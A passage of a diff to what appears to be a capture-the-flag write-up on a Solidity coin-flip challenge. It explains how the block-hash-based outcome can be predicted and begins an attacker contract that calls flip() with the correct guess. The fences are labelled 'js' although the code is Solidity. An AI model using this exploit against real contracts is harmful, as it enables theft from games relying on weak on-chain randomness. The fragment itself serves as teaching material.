@@ -12,26 +12,26 @@ In this case we can _always_ be right, given that there's 2 factors that generat
 
 1. The variable FACTOR
 
-```cs
+```js
 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 ```
 
 2. The block hash of the previous block to the coinflip converted to integer
 
-```cs
+```js
 uint256 blockValue = uint256(blockhash(block.number.sub(1)));
 ```
 
 Our coinflip is floor of the ratio between `blockValue` and `FACTOR`
 
-```cs
+```js
 uint256 coinFlip = blockValue.div(FACTOR);
 bool side = coinFlip == 1 ? true : false;
 ```
 
 The problem is then solved by creating an attacker contract that uses the same logic to generate coinflips, but instead to make the guess. Then the guess is plugged into the `flip()` function. 
 
-```cs
+```js
 function callFlip() external {
     uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     uint256 blockVal = uint256(blockhash(block.number - 1));
